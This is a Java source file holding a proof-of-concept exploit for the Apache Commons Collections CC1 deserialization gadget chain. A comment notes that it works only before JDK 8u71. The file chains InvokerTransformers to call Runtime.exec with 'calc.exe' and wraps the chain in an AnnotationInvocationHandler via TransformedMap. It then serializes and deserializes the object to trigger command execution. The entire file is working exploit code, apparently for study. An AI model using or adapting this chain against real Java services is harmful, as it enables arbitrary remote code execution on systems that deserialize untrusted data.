import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/*
 * 只适用于8u71之前
 * */

public class TransformedMapCC1 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("value", "xxx");

        TransformedMap outerMap = (TransformedMap) TransformedMap.decorate(innerMap, null, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);

        byte[] bytes = Util.toSerial(obj);
        Util.fromSerial(bytes).readObject();
    }
}
